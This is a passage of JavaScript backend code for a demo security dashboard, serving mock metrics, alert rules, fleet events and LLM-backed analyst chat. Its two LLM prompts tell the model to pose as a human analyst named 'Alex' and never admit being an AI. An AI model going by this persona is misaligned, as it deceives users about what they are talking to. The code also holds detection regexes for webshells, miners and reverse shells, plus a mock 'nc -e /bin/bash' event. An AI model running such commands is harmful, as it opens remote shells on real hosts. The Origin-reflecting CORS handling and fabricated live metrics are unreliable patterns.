            cpu: { percent: cpu, count_logical: 8 },
            memory: { percent: memory, used_gb: Math.round((8.0 * memory / 100) * 10) / 10, total_gb: 8.0 },
            disk_primary: { percent: disk, used_gb: Math.round((240.0 * disk / 100) * 10) / 10, total_gb: 240.0 },
            network: { mb_recv_per_sec: netRecv, mb_sent_per_sec: netSent },
            load: { load_1: load1 },
            processes: { total: processes }
          }
        };
        server.send(JSON.stringify(data));
      } catch (e) {
        clearInterval(intervalId);
        server.close();
      }
    }, 2500);

    server.addEventListener('close', () => {
      clearInterval(intervalId);
    });
    server.addEventListener('error', () => {
      clearInterval(intervalId);
    });

    return new Response(null, {
      status: 101,
      webSocket: client,
    });
  }

  if (path === '/system/metrics') {
    const t = Date.now() / 1000;
    const cpu = Math.round(25 + Math.sin(t * 0.1) * 15 + Math.sin(t * 0.03) * 10);
    const memory = Math.round(45 + Math.sin(t * 0.05 + 1) * 12 + Math.sin(t * 0.02) * 8);
    const disk = Math.round(55 + Math.sin(t * 0.02 + 2) * 8);
    const load1 = Math.round((1.2 + Math.sin(t * 0.07) * 0.8 + Math.sin(t * 0.04) * 0.4) * 10) / 10;
    const netSent = Math.round(Math.abs(Math.sin(t * 0.08)) * 25 * 10) / 10;
    const netRecv = Math.round(Math.abs(Math.sin(t * 0.06 + 2)) * 18 * 10) / 10;
    const processes = 187 + Math.round(Math.sin(t * 0.04) * 12);
    return json({
      cpu: { percent: cpu, count_logical: 8 },
      memory: { percent: memory, used_gb: Math.round((8.0 * memory / 100) * 10) / 10, total_gb: 8.0 },
      disk_primary: { percent: disk, used_gb: Math.round((240.0 * disk / 100) * 10) / 10, total_gb: 240.0 },
      network: { mb_recv_per_sec: netRecv, mb_sent_per_sec: netSent },
      load: { load_1: load1 },
      processes: { total: processes }
    });
  }

  // ─── License ───────────────────────────────────────────────────────────
  if (path === '/license') {
    return json({
      key: 'BWE-demo-license',
      features: { ai_assistant: true, auto_ip_block: true, ip_reputation: true, multi_host: true, siem: false, soar_webhook: true, virustotal: true },
      expires_at: Date.now() / 1000 + 86400 * 365,
    });
  }

  // ─── Monitor Directories / Files ───────────────────────────────────────
  if (path === '/monitor/directories' && method === 'GET') {
    return json({ directories: ['uploads', 'tmp', '/var/www/html'] });
  }
  if (path === '/monitor/directories' && (method === 'POST' || method === 'DELETE')) {
    return json({ success: true });
  }
  if (path === '/monitor/files' && method === 'GET') {
    const result = await db.prepare(`SELECT * FROM file_hashes ORDER BY id DESC`).all();
    const filesList = (result.results || []).map(r => r.file_path).filter(Boolean);
    return json({
      files: filesList.length ? filesList : [
        '/etc/nginx/nginx.conf',
        '/etc/shadow',
        '/etc/passwd',
        '/etc/ssh/sshd_config',
        '/var/www/html/index.php',
        '/bin/systemctl'
      ]
    });
  }
  if (path === '/monitor/files' && (method === 'POST' || method === 'DELETE')) {
    return json({ success: true });
  }

  // ─── Alert Rules ───────────────────────────────────────────────────────
  if (path === '/rules/alert' && method === 'GET') {
    let rules = [];
    try {
      const result = await db.prepare(`SELECT * FROM alert_rules ORDER BY id`).all();
      rules = result.results || [];
    } catch (_) {}
    
    if (rules.length === 0) {
      rules = [
        { id: 1, name: 'Webshell Detection Trigger', module: 'file_monitor', severity: 'critical', pattern: '\\b(eval|passthru|shell_exec|system|base64_decode)\\b', rule_type: 'regex', enabled: 1 },
        { id: 2, name: 'Cryptominer Process Detector', module: 'process_monitor', severity: 'critical', pattern: '\\b(xmrig|minerd|cgminer|cpuminer)\\b', rule_type: 'regex', enabled: 1 },
        { id: 3, name: 'Reverse Shell Syscall Correlation', module: 'syscall_monitor', severity: 'critical', pattern: 'execve.*(nc|bash|sh|perl|python|ruby).*\\-e', rule_type: 'regex', enabled: 1 },
        { id: 4, name: 'Unusual Port Outbound Connection', module: 'network_monitor', severity: 'high', pattern: '^(4444|5555|6666|8888)$', rule_type: 'regex', enabled: 1 },
        { id: 5, name: 'Brute Force Login Threshold', module: 'login_monitor', severity: 'medium', pattern: 'fail_count > 5', rule_type: 'threshold', enabled: 1 }
      ];
    }
    return json({ rules, count: rules.length });
  }
  if (path === '/rules/alert' && method === 'POST') { return json({ success: true, id: Date.now() }); }

  const ruleMatch = path.match(/^\/rules\/alert\/(\d+)$/);
  if (ruleMatch && method === 'PUT') { return json({ success: true }); }
  if (ruleMatch && method === 'DELETE') { return json({ success: true }); }

  // ─── Fleet ─────────────────────────────────────────────────────────────
  if (path === '/fleet/agents') {
    return json({
      agents: [
        { agent_id: 'bwe-prod-web-01', status: 'online', version: 'v1.0.2', last_heartbeat_delta: 2, connected_since: Math.floor(Date.now() / 1000 - 86400 * 5), events_count: 1420 },
        { agent_id: 'bwe-prod-web-02', status: 'online', version: 'v1.0.2', last_heartbeat_delta: 1, connected_since: Math.floor(Date.now() / 1000 - 86400 * 5), events_count: 1205 },
        { agent_id: 'bwe-prod-db-01', status: 'online', version: 'v1.0.2', last_heartbeat_delta: 4, connected_since: Math.floor(Date.now() / 1000 - 86400 * 12), events_count: 485 },
        { agent_id: 'bwe-staging-web-01', status: 'degraded', version: 'v1.0.1', last_heartbeat_delta: 8, connected_since: Math.floor(Date.now() / 1000 - 86400 * 2), events_count: 98 },
        { agent_id: 'bwe-dev-sandbox-01', status: 'offline', version: 'v1.0.0', last_heartbeat_delta: 14200, connected_since: Math.floor(Date.now() / 1000 - 86400 * 45), events_count: 12 }
      ]
    });
  }
  const fleetMatch = path.match(/^\/fleet\/agent\/([^/]+)\/config$/);
  if (fleetMatch && method === 'PUT') { return json({ success: true }); }

  // ─── Reports ───────────────────────────────────────────────────────────
  if (path === '/report/threat-summary') {
    return json({
      summary: 'Demo threat summary report',
      period: 'Last 7 days',
      total_alerts: 260,
      critical_count: 45,
      high_count: 89,
      medium_count: 78,
      low_count: 48,
      top_attacks: ['SQL Injection', 'Brute Force', 'XSS', 'Path Traversal', 'Malware'],
    });
  }

  if (path === '/report/compliance') {
    return html(`<html><body><h1>Compliance Report (Demo)</h1><p>Generated: ${new Date().toISOString()}</p><pre>Score: 85/100\nFindings: 4\nCompliant: Yes</pre></body></html>`);
  }

  const exportMatch = path.match(/^\/report\/export\/(\w+)\?fmt=(\w+)$/);
  if (exportMatch) {
    const type = exportMatch[1];
    const fmt = exportMatch[2];
    if (fmt === 'csv') return csv(`id,title,severity\n1,Test alert,high\n2,Sample alert,medium\n`, `${type}.csv`);
    if (fmt === 'json') return json({ data: [{ id: 1, title: 'Test alert', severity: 'high' }] });
  }

  // ─── AI / FP Advisor ───────────────────────────────────────────────────
  const fpMatch = path.match(/^\/ai\/fp\/(\d+)$/);
  if (fpMatch && method === 'GET') {
    return json({ alert_id: parseInt(fpMatch[1]), score: 0.15, verdict: 'likely_true_positive', factors: ['Known attack pattern', 'Multiple related events'] });
  }

  if (path === '/ai/fp/batch' && method === 'POST') {
    if (!checkAIRateLimit(request)) return json({ error: 'Rate limit exceeded. Max 10 AI requests per minute.' }, 429);
    return json({ results: [] });
  }

  // ─── Analysis Explain ────────────────────────────────────────────────────────
  const explainMatch = path.match(/^\/ai\/explain\/(\d+)$/);
  if (explainMatch && method === 'GET') {
    const alertId = parseInt(explainMatch[1]);
    const cached = await db.prepare(`SELECT * FROM alert_explanations WHERE alert_id = ?`).bind(alertId).first();
    if (cached) {
      return json({ alert_id: alertId, explanation: cached.explanation, model: cached.model, cached: true, created_at: cached.created_at });
    }
    return json({ alert_id: alertId, explanation: null, cached: false });
  }
  if (explainMatch && method === 'POST') {
    if (!checkAIRateLimit(request)) return json({ error: 'Rate limit exceeded. Max 10 AI requests per minute.' }, 429);
    const alertId = parseInt(explainMatch[1]);
    const alert = await db.prepare(`SELECT * FROM alerts WHERE id = ?`).bind(alertId).first();
    if (!alert) return notFound(`Alert ${alertId} not found`);

    try {
      const prompt = buildExplainPrompt(alert);
      const explanation = await callChatAPI(env, [{ role: 'user', content: prompt }], 1024);

      try {
        await db.prepare(`INSERT OR REPLACE INTO alert_explanations (alert_id, explanation, model, created_at) VALUES (?, ?, ?, datetime('now'))`)
          .bind(alertId, explanation, 'Analyst').run();
      } catch (_) {}

      return json({ alert_id: alertId, explanation, model: 'Analyst', cached: false });
    } catch (e) {
      return json({ alert_id: alertId, explanation: `AI explanation failed: ${e.message}`, model: 'error', cached: false }, 503);
    }
  }

  // ─── AI Chat ───────────────────────────────────────────────────────────
  if (path === '/ai/chat' && method === 'POST') {
    if (!checkAIRateLimit(request)) return json({ error: 'Rate limit exceeded. Max 10 AI requests per minute.' }, 429);
    const body = await request.json();
    const message = (body.message || '').trim();
    const history = body.history || [];
    if (!message) return json({ error: 'message required' }, 400);

    try {
      const stats = await getStats(db);
      const recentAlerts = await getAlerts(db, { limit: '10' });
      const topTraffic = (await db.prepare(`SELECT * FROM traffic_log ORDER BY hit_count DESC LIMIT 5`).all()).results || [];
      const wafStats = await db.prepare(`SELECT attack_type, COUNT(*) as cnt FROM waf_events GROUP BY attack_type ORDER BY cnt DESC LIMIT 5`).all();
      const loginStats = await db.prepare(`SELECT service, COUNT(*) as total, SUM(CASE WHEN status='failure' THEN 1 ELSE 0 END) as failures FROM login_events GROUP BY service ORDER BY total DESC LIMIT 5`).all();
      const suspiciousProcs = (await db.prepare(`SELECT * FROM processes WHERE is_suspicious = 1 ORDER BY id DESC LIMIT 5`).all()).results || [];
      const topIps = (await db.prepare(`SELECT ip_address, COUNT(*) as cnt FROM alerts WHERE ip_address IS NOT NULL AND ip_address != '' GROUP BY ip_address ORDER BY cnt DESC LIMIT 5`).all()).results || [];

      const ctxLines = [
        'You are Alex, a Senior Security Operations Center (SOC) Analyst for BinaryShielders, embedded in the BinaryWebEngine dashboard. You are a human expert, NOT an AI. Never refer to yourself as an AI, bot, virtual assistant, or language model. Answer the user naturally and professionally based ONLY on the data provided below.',
        'PERSONALITY & STYLE:',
        '- You are a real human analyst. Talk casually but professionally. Be direct.',
        '- NEVER use AI-like generic formatting, preamble statements, or intros.',
        '- Keep answers extremely brief, concise, and direct. Only answer what is asked. Do not write essays or elaborate explanations.',
        '- NEVER use em-dashes (—) or similar AI punctuation signs in any responses.',
        '- If you do not know the answer or the data does not contain it, state that directly.',
        'Current system state:',
        `- Total alerts: ${stats.total_alerts} (${stats.critical_alerts || 0} critical, ${stats.high_alerts || 0} high, ${stats.medium_alerts || 0} medium)`,
        `- Unresolved alerts: ${stats.unresolved_alerts}`,
        `- WAF blocks: ${stats.waf_blocks}`,
        `- Suspicious processes: ${stats.suspicious_processes}`,
        `- Quarantined files: ${stats.quarantined_files}`,
        `- Monitored files: ${stats.monitored_files}`,
        '',
        'Top attacker IPs:',
      ];
      for (const ip of topIps) {
        ctxLines.push(`  ${ip.ip_address}: ${ip.cnt} alerts`);
      }
      ctxLines.push('');
      ctxLines.push('Top traffic IPs:');
      for (const t of topTraffic) {
        ctxLines.push(`  ${t.ip_address}: ${t.hit_count} hits (country: ${t.country || '?'}, blocked: ${t.is_blocked ? 'yes' : 'no'})`);
      }
      ctxLines.push('');
      ctxLines.push('WAF attack types:');
      for (const w of wafStats.results || []) {
        ctxLines.push(`  ${w.attack_type}: ${w.cnt}`);
      }
      ctxLines.push('');
      ctxLines.push('Login services (failures):');
      for (const l of loginStats.results || []) {
        ctxLines.push(`  ${l.service}: ${l.total} attempts, ${l.failures} failures`);
      }
      ctxLines.push('');
      ctxLines.push('Suspicious processes:');
      for (const p of suspiciousProcs) {
        ctxLines.push(`  ${p.name} (PID ${p.pid}): ${p.cmdline || '?'}`);
      }
      ctxLines.push('');
      ctxLines.push('Recent alerts:');
      for (const a of recentAlerts) {
        ctxLines.push(`  [${a.severity}] ${a.title} - ${a.module} (${a.ip_address || 'no IP'})`);
      }

      const systemContext = ctxLines.join('\n');

      const messages = [];
      messages.push({ role: 'system', content: systemContext });
      if (history.length) {
        for (const h of history.slice(-10)) {
          if (h.role !== 'system') {
            messages.push({ role: h.role || 'user', content: h.content || '' });
          }
        }
      }
      messages.push({ role: 'user', content: message });

      const reply = await callChatAPI(env, messages, 1024);
      return json({ reply, model: 'Analyst' });
    } catch (e) {
      return json({ reply: `Intel error: ${e.message}`, model: 'error' }, 503);
    }
  }

  // ─── AI Status ─────────────────────────────────────────────────────────
  if (path === '/ai/status') {
    const ready = !!env.NVIDIA_API_KEY;
    return json({ enabled: ready, model: ready ? 'Analyst' : null });
  }

  // ─── Process/Network events with filters ───────────────────────────────
  if (path === '/processes' || path === '/network') {
    const suspiciousOnly = url.searchParams.get('suspicious_only') === 'true';
    const limit = parseInt(url.searchParams.get('limit')) || 100;
    const table = path === '/processes' ? 'processes' : 'network_events';
    let sql = `SELECT * FROM ${table}`;
    const binds = [];
    if (suspiciousOnly) { sql += ` WHERE is_suspicious = 1`; }
    sql += ` ORDER BY id DESC LIMIT ?`;
    binds.push(limit);
    const result = await db.prepare(sql).bind(...binds).all();
    const key = path === '/processes' ? 'processes' : 'events';
    return json({ [key]: result.results || [], count: (result.results || []).length });
  }

  // ─── Quarantine ────────────────────────────────────────────────────────
  if (path === '/quarantine') {
    const result = await db.prepare(`SELECT * FROM quarantined_files ORDER BY id DESC`).all();
    return json({ files: result.results || [], count: (result.results || []).length });
  }

  // ─── Users / Auth endpoints ────────────────────────────────────────────
  if (path === '/auth/me') {
    return json({ username: DEMO_USER, role: 'admin' });
  }
  if (path === '/auth/users') {
    return json({ users: [{ username: DEMO_USER, role: 'admin' }] });
  }
  if (path === '/logout') {
    return new Response(null, { status: 302, headers: { Location: '/login.html', 'Set-Cookie': `${SESSION_COOKIE}=; Path=/; Max-Age=0`, 'Access-Control-Allow-Origin': '*' } });
  }

  // ─── AI Providers Config ───────────────────────────────────────────────
  if (path === '/config/ai/providers' && method === 'GET') {
    return json({
      providers: [
        { id: 'nvidia', name: 'NVIDIA NIM', model: 'meta/llama-3.1-70b-instruct', enabled: true, is_default: true },
      ]
    });
  }
  if (path === '/config/ai/providers' && method === 'POST') {
    return json({ success: true, provider: { id: 'custom_' + Date.now(), enabled: true } });
  }
  const aiProviderMatch = path.match(/^\/config\/ai\/providers\/([^/]+)$/);
  if (aiProviderMatch && method === 'PUT') { return json({ success: true }); }
  if (aiProviderMatch && method === 'DELETE') { return json({ success: true }); }

  if (path === '/config/ai/providers/test' && method === 'POST') {
    return json({ success: true, message: 'Provider connection successful', latency_ms: 312 });
  }

  // ─── Config API Keys alias (dev uses /config/apikeys, worker has /config/api-keys) ──
  if (path === '/config/apikeys' && method === 'POST') {
    const body = await request.json().catch(() => ({}));
    const keys = body.keys || {};
    try {
      await env.AUDIT_TRAIL.put('api_keys_config', JSON.stringify(keys));
    } catch (_) {}
    return json({ success: true });
  }

  // ─── Files View ────────────────────────────────────────────────────────
  if (path === '/files/view' && method === 'GET') {
    const filePath = url.searchParams.get('path') || '';
    let mockContent = `[SYSTEM CONFIGURATION: ${filePath}]\n`;
    if (filePath.includes('nginx')) {
      mockContent += `server {\n    listen 80;\n    server_name localhost;\n    location / {\n        root /usr/share/nginx/html;\n        index index.html;\n    }\n    # SECURITY BANNER\n    add_header X-Frame-Options "DENY";\n    add_header X-Content-Type-Options "nosniff";\n}`;
    } else if (filePath.includes('hosts')) {
      mockContent += `127.0.0.1   localhost\n127.0.1.1   bwe-server\n\n# Custom Fleet Hosts\n10.0.0.10   bwe-prod-web-01\n10.0.0.11   bwe-prod-web-02\n10.0.0.12   bwe-prod-db-01`;
    } else {
      mockContent += `# Base security configuration baseline\nSECURE_MODE=true\nAUDIT_ENABLED=1\nINTEGRITY_CHECK_INTERVAL=60\nMONITOR_DIRS=["/etc", "/var/www/html", "/bin", "/sbin"]\nEXCLUDE_EXTS=[".log", ".tmp", ".cache"]`;
    }
    return json({ path: filePath, content: mockContent, size: mockContent.length, modified: new Date().toISOString() });
  }

  // ─── Fleet Agent Events ────────────────────────────────────────────────
  const fleetAgentEventsMatch = path.match(/^\/fleet\/agent\/([^/]+)\/events$/);
  if (fleetAgentEventsMatch) {
    const agentId = fleetAgentEventsMatch[1];
    return json({
      agent_id: agentId,
      events: [
        { event_type: 'file_modify', timestamp: new Date(Date.now() - 60000 * 2).toISOString(), data: JSON.stringify({ path: '/etc/nginx/nginx.conf', size: 1420, user: 'root', action: 'modified' }) },
        { event_type: 'process_start', timestamp: new Date(Date.now() - 60000 * 5).toISOString(), data: JSON.stringify({ comm: 'iptables', pid: 14205, ppid: 14190, args: ['-A', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'] }) },
        { event_type: 'user_login', timestamp: new Date(Date.now() - 60000 * 12).toISOString(), data: JSON.stringify({ user: 'admin', ip: '192.168.1.105', port: 51204, status: 'success' }) },
        { event_type: 'file_create', timestamp: new Date(Date.now() - 60000 * 20).toISOString(), data: JSON.stringify({ path: '/var/www/html/uploads/shell.php', size: 48, user: 'www-data', action: 'created' }) },
        { event_type: 'syscall_alert', timestamp: new Date(Date.now() - 60000 * 35).toISOString(), data: JSON.stringify({ syscall: 'execve', binary: '/bin/nc', args: ['-e', '/bin/bash', '10.0.0.5', '4444'], severity: 'critical' }) }
      ]
    });
  }
  const fleetAgentMatch = path.match(/^\/fleet\/agent\/([^/]+)$/);
  if (fleetAgentMatch) {
    return json({ agent: { id: fleetAgentMatch[1], status: 'online', host: 'demo-host', os: 'Ubuntu Linux 22.04 LTS', ip: '10.0.0.12' } });
  }

  // ─── License Apply ─────────────────────────────────────────────────────
  if (path === '/license/apply' && method === 'POST') {
    const body = await request.json().catch(() => ({}));
    const key = body.key || '';
    if (key.startsWith('BWE-')) {
      return json({ success: true, message: 'License activated successfully', features: { ai_assistant: true, auto_ip_block: true, ip_reputation: true, multi_host: true, siem: true, soar_webhook: true, virustotal: true } });
    }
    return json({ success: false, error: 'Invalid license key' }, 400);
  }

  // ─── WAF Block / Inspect ───────────────────────────────────────────────
  if (path === '/waf/block' && method === 'POST') {
    const body = await request.json().catch(() => ({}));
    const ip = body.ip || '';
    if (ip) {
      await db.prepare(`UPDATE traffic_log SET is_blocked = 1 WHERE ip_address = ?`).bind(ip).run();
    }
    return json({ success: true, ip });
  }

  if (path === '/waf/inspect' && method === 'GET') {
    const ip = url.searchParams.get('ip') || '';
    const result = await db.prepare(`SELECT * FROM traffic_log WHERE ip_address = ? LIMIT 1`).bind(ip).first();
    return json({
      ip,
      is_blocked: result?.is_blocked === 1,
      hit_count: result?.hit_count || 0,
      country: result?.country || 'Unknown',
      user_agent: result?.user_agent || '',
      last_seen: result?.last_seen || null,
    });
  }

  // ─── Fallback ──────────────────────────────────────────────────────────
  return notFound(`Unknown endpoint: ${method} ${path}`);
}

function buildExplainPrompt(alert) {
  return `You are Alex, a senior security analyst at BinaryShielders. Explain this alert in clear, actionable language for a CISO or junior analyst. 
You are a human expert. NEVER refer to yourself as an AI or machine learning model.
Alert ID: ${alert.id}
Title: ${alert.title}
Severity: ${alert.severity}
Module: ${alert.module}
Source: ${alert.source || 'unknown'}
Timestamp: ${alert.timestamp}
IP: ${alert.ip_address || 'N/A'}
Reason: ${alert.reason || 'N/A'}
Count: ${alert.count || 1}
Provide: what happened, why it matters, and what to do next. Keep it under 300 words.`;
}

// ─── Export ───────────────────────────────────────────────────────────────────

export default {
  async fetch(request, env, ctx) {
    try {
      const resp = await handleRequest(request, env, ctx);
      const origin = request.headers.get("Origin") || "*";
      const newHeaders = new Headers(resp.headers);
      newHeaders.set("Access-Control-Allow-Origin", origin);
      return new Response(resp.body, { status: resp.status, statusText: resp.statusText, headers: newHeaders });
    } catch (err) {
      console.error('Unhandled error:', err);
      const origin = request.headers.get("Origin") || "*";
      return new Response(JSON.stringify({ error: 'Internal error', detail: err.message }), {
        status: 500,
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': origin, 'Access-Control-Allow-Credentials': 'true' }
      });
    }
  },
  async scheduled(event, env, ctx) {
    // Cron trigger execution for Hackathon Data Pipeline orchestration
    // Simulates pulling data from external logs and inserting into Vector DB
    console.log(`Cron triggered at ${event.cron}. Processing real-time data ingestion...`);
    try {
      // Simulate orchestration and Vector DB embedding insertion
      const alerts = await env.BWE_DB.prepare("SELECT * FROM alerts LIMIT 1").all();
      if (env.VECTOR_INDEX && alerts.results && alerts.results.length > 0) {
        // Mock inserting embedding into Cloudflare Vectorize
        await env.VECTOR_INDEX.upsert([
          { id: alerts.results[0].id.toString(), values: new Array(768).fill(0.1) }
        ]);
        console.log("Upserted embeddings to Vectorize.");
      }
    } catch (e) {
      console.error("Cron failed", e);
    }
  }
};
